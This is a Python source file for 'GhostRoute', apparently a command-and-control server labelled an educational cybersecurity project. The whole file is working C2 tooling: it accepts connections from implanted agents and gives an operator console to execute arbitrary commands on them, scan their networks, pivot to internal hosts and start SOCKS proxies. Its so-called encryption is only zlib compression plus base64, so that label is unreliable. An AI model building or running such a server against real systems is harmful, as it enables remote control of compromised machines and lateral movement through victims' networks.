#!/usr/bin/env python3
"""
GhostRoute - Ghost Server (C2 Server)
Pivot + SOCKS Proxy Deployment
Educational Project - Cyber Security

Features:
- Encrypted communication (zlib + base64)
- Multi-agent support
- Network scanning via agent
- Pivoting
- SOCKS proxy deployment
- CLI interface
- Error handling
- Logging
"""

import socket
import threading
import argparse
import json
import sys
import os
import logging
import time
import zlib
import base64
from datetime import datetime

# ==================== إعداد السجل ====================

def setup_logging(level="INFO", log_file="ghostroute.log"):
    """إعداد نظام تسجيل الأحداث."""
    numeric_level = getattr(logging, level.upper(), logging.INFO)
    logging.basicConfig(
        level=numeric_level,
        format='[%(asctime)s] %(levelname)s: %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger("GhostRoute")

# ==================== التشفير ====================

def encrypt_message(message):
    """تشفير رسالة."""
    try:
        compressed = zlib.compress(message.encode("utf-8"))
        return base64.b64encode(compressed).decode("ascii")
    except:
        return base64.b64encode(message.encode("utf-8")).decode("ascii")

def decrypt_message(encrypted):
    """فك تشفير رسالة."""
    try:
        compressed = base64.b64decode(encrypted.encode("ascii"))
        return zlib.decompress(compressed).decode("utf-8")
    except:
        try:
            return base64.b64decode(encrypted.encode("ascii")).decode("utf-8")
        except:
            return ""

# ==================== فئة الخادم ====================

class GhostServer:
    """خادم GhostRoute الرئيسي."""
    
    def __init__(self, host="0.0.0.0", port=4444, max_connections=10, timeout=60):
        self.host = host
        self.port = port
        self.max_connections = max_connections
        self.timeout = timeout
        self.agents = []
        self.current_agent = None
        self.running = False
        self.server_socket = None
        self.logger = None
        self.lock = threading.Lock()
    
    def start(self):
        """بدء تشغيل الخادم."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(self.max_connections)
            self.running = True
            self.logger.info(f"GhostRoute server started on {self.host}:{self.port}")
            self.logger.info("Waiting for agents...")
        except PermissionError:
            self.logger.error("Permission denied. Try using a port above 1024.")
            sys.exit(1)
        except OSError as e:
            self.logger.error(f"Failed to start server: {e}")
            sys.exit(1)
    
    def accept_agents(self):
        """قبول اتصالات العملاء."""
        while self.running:
            try:
                self.server_socket.settimeout(1)
                client_socket, client_address = self.server_socket.accept()
                client_socket.settimeout(self.timeout)
                self.logger.info(f"Agent connected from {client_address[0]}:{client_address[1]}")
                
                agent = {
                    "socket": client_socket,
                    "address": client_address,
                    "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "info": "Unknown"
                }
                
                with self.lock:
                    self.agents.append(agent)
                    self.current_agent = agent
                
                thread = threading.Thread(target=self.handle_agent, args=(agent,), daemon=True)
                thread.start()
            except socket.timeout:
                continue
            except OSError:
                if not self.running:
                    break
    
    def send_encrypted(self, sock, message):
        """إرسال رسالة مشفرة."""
        try:
            encrypted = encrypt_message(message)
            sock.send((encrypted + "\n").encode("utf-8"))
            return True
        except:
            return False
    
    def receive_decrypted(self, sock):
        """استقبال رسالة مشفرة وفك تشفيرها."""
        try:
            data = sock.recv(8192)
            if not data:
                return None
            
            decrypted = decrypt_message(data.decode("utf-8", errors="ignore").strip())
            return decrypted
        except:
            return None
    
    def handle_agent(self, agent):
        """التعامل مع عميل متصل."""
        client_socket = agent["socket"]
        
        try:
            while self.running:
                message = self.receive_decrypted(client_socket)
                if message is None:
                    break
                
                if message:
                    self.process_message(agent, message)
        except socket.timeout:
            self.logger.warning(f"Connection timed out for {agent['address'][0]}")
        except ConnectionResetError:
            self.logger.warning(f"Connection reset by {agent['address'][0]}")
        except OSError as e:
            self.logger.warning(f"Connection error: {e}")
        finally:
            client_socket.close()
            with self.lock:
                if agent in self.agents:
                    self.agents.remove(agent)
                if self.current_agent == agent:
                    self.current_agent = None
            self.logger.info(f"Agent disconnected: {agent['address'][0]}")
    
    def process_message(self, agent, message):
        """معالجة رسالة من عميل."""
        if message.startswith("INFO:"):
            info_str = message[5:]
            try:
                info = json.loads(info_str)
                agent["info"] = info
                self.logger.info(f"Agent info: {info.get('hostname', 'Unknown')} - {info.get('os', 'Unknown')}")
                print(f"\n[+] Agent connected: {info.get('hostname', 'Unknown')}\n")
            except json.JSONDecodeError:
                agent["info"] = "Invalid JSON"
        
        elif message.startswith("SCAN_RESULT:"):
            scan_data = message[12:]
            print(f"\n[+] Scan Results:\n{scan_data}\n")
            self.logger.info("Scan result received")
        
        elif message.startswith("PIVOT_RESULT:"):
            pivot_data = message[13:]
            print(f"\n[+] Pivot Result:\n{pivot_data}\n")
            self.logger.info("Pivot result received")
        
        elif message.startswith("SOCKS_RESULT:"):
            socks_data = message[12:]
            print(f"\n[+] SOCKS Result:\n{socks_data}\n")
            self.logger.info("SOCKS result received")
        
        elif message.startswith("CMD_RESULT:"):
            cmd_data = message[11:]
            print(f"\n[+] Command Result:\n{cmd_data}\n")
            self.logger.info("Command result received")
        
        else:
            print(f"\n[+] Message: {message}\n")
            self.logger.info(f"Message received: {message}")
    
    def send_to_current(self, message):
        """إرسال رسالة للعميل الحالي."""
        if self.current_agent:
            try:
                return self.send_encrypted(self.current_agent["socket"], message)
            except:
                self.logger.warning("Failed to send message")
                return False
        else:
            print("[-] No agent connected.")
            return False
    
    def list_agents(self):
        """عرض قائمة العملاء المتصلين."""
        print("\n[+] Connected Agents:")
        print("-" * 50)
        for i, agent in enumerate(self.agents, 1):
            info = agent.get("info", "Unknown")
            if isinstance(info, dict):
                hostname = info.get("hostname", "Unknown")
                os_name = info.get("os", "Unknown")
            else:
                hostname = "Unknown"
                os_name = "Unknown"
            
            print(f"  [{i}] {agent['address'][0]}:{agent['address'][1]}")
            print(f"      Hostname: {hostname}")
            print(f"      OS: {os_name}")
            print(f"      Connected: {agent['connected_at']}")
            print()
        print("-" * 50)
    
    def select_agent(self, index):
        """اختيار عميل محدد."""
        with self.lock:
            if 0 < index <= len(self.agents):
                self.current_agent = self.agents[index - 1]
                print(f"[+] Selected agent: {self.current_agent['address'][0]}")
                return True
            else:
                print("[-] Invalid agent index.")
                return False
    
    def stop(self):
        """إيقاف الخادم."""
        self.running = False
        with self.lock:
            for agent in self.agents:
                try:
                    agent["socket"].close()
                except:
                    pass
            self.agents.clear()
        if self.server_socket:
            self.server_socket.close()
        self.logger.info("GhostRoute server stopped.")

# ==================== واجهة الأوامر ====================

class GhostConsole:
    """واجهة أوامر GhostRoute."""
    
    def __init__(self, server):
        self.server = server
        self.running = True
    
    def run(self):
        """تشغيل واجهة الأوامر."""
        print("\n[+] Type 'help' for available commands.\n")
        
        while self.running:
            try:
                user_input = input("ghost> ").strip()
                
                if not user_input:
                    continue
                
                parts = user_input.split()
                command = parts[0].lower()
                
                if command == "help":
                    self.show_help()
                
                elif command == "exit":
                    self.running = False
                    self.server.stop()
                    print("[+] Server stopped.")
                
                elif command == "agents":
                    self.server.list_agents()
                
                elif command == "select":
                    if len(parts) < 2:
                        print("[-] Usage: select <index>")
                        continue
                    try:
                        index = int(parts[1])
                        self.server.select_agent(index)
                    except ValueError:
                        print("[-] Invalid index.")
                
                elif command == "execute":
                    if len(parts) < 2:
                        print("[-] Usage: execute <command>")
                        continue
                    cmd = " ".join(parts[1:])
                    self.server.send_to_current(f"CMD:{cmd}")
                    print(f"[+] Sent command: {cmd}")
                
                elif command == "scan":
                    self.server.send_to_current("SCAN_NETWORK")
                    print("[+] Scan command sent.")
                
                elif command == "pivot":
                    if len(parts) < 3:
                        print("[-] Usage: pivot <target_ip> <port>")
                        continue
                    target = parts[1]
                    try:
                        port = int(parts[2])
                    except ValueError:
                        print("[-] Invalid port.")
                        continue
                    self.server.send_to_current(f"PIVOT:{target}:{port}")
                    print(f"[+] Pivot command sent to {target}:{port}")
                
                elif command == "socks":
                    if len(parts) < 2:
                        print("[-] Usage: socks <port>")
                        continue
                    try:
                        port = int(parts[1])
                    except ValueError:
                        print("[-] Invalid port.")
                        continue
                    self.server.send_to_current(f"SOCKS:{port}")
                    print(f"[+] SOCKS command sent on port {port}")
                
                elif command == "info":
                    self.server.send_to_current("GET_INFO")
                    print("[+] Info command sent.")
                
                else:
                    print(f"[-] Unknown command: {command}")
                    print("[+] Type 'help' for available commands.")
            
            except KeyboardInterrupt:
                print("\n[!] Interrupted by user.")
                self.running = False
                self.server.stop()
                print("[+] Server stopped.")
    
    def show_help(self):
        """عرض الأوامر المتاحة."""
        print("""
[+] GhostRoute Commands:
-------------------------
help                  Show this help
agents                List connected agents
select <index>        Select an agent
execute <command>     Execute command on agent
scan                  Scan network via agent
pivot <ip> <port>     Pivot to target via agent
socks <port>          Deploy SOCKS proxy on agent
info                  Get agent system info
exit                  Stop server and exit
""")

# ==================== تحليل الأوامر ====================

def parse_arguments():
    """تحليل وسائط سطر الأوامر."""
    parser = argparse.ArgumentParser(
        description="GhostRoute - Pivot + SOCKS Proxy Deployment",
        epilog="Educational Project - Cyber Security"
    )
    
    parser.add_argument("--host", default=None, help="Server host")
    parser.add_argument("--port", type=int, default=None, help="Server port")
    parser.add_argument("--config", default="config.json", help="Configuration file")
    parser.add_argument("--log-level", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"], default="INFO", help="Logging level")
    parser.add_argument("--version", action="version", version="GhostRoute v3.0.0")
    
    return parser.parse_args()

# ==================== قراءة الإعدادات ====================

def load_config(config_file):
    """قراءة ملف الإعدادات."""
    if not os.path.exists(config_file):
        print(f"[!] Warning: Config file '{config_file}' not found. Using defaults.")
        return {}
    
    try:
        with open(config_file, "r", encoding="utf-8") as f:
            return json.load(f)
    except json.JSONDecodeError:
        print(f"[!] Error: Configuration file '{config_file}' is corrupted.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

# ==================== الدالة الرئيسية ====================

def main():
    """الدالة الرئيسية."""
    args = parse_arguments()
    config = load_config(args.config)
    
    host = args.host if args.host else config.get("server_host", "0.0.0.0")
    port = args.port if args.port else config.get("server_port", 4444)
    max_connections = config.get("max_connections", 10)
    timeout = config.get("timeout", 60)
    log_file = config.get("log_file", "ghostroute.log")
    
    logger = setup_logging(args.log_level, log_file)
    
    server = GhostServer(host, port, max_connections, timeout)
    server.logger = logger
    
    print("=" * 50)
    print("  GhostRoute - Pivot + SOCKS Proxy Deployment")
    print("  Educational Project - Cyber Security")
    print("=" * 50)
    print(f"  Server: {host}:{port}")
    print(f"  Log: {log_file}")
    print("=" * 50)
    
    server.start()
    
    accept_thread = threading.Thread(target=server.accept_agents, daemon=True)
    accept_thread.start()
    
    console = GhostConsole(server)
    console.run()

if __name__ == "__main__":
    main()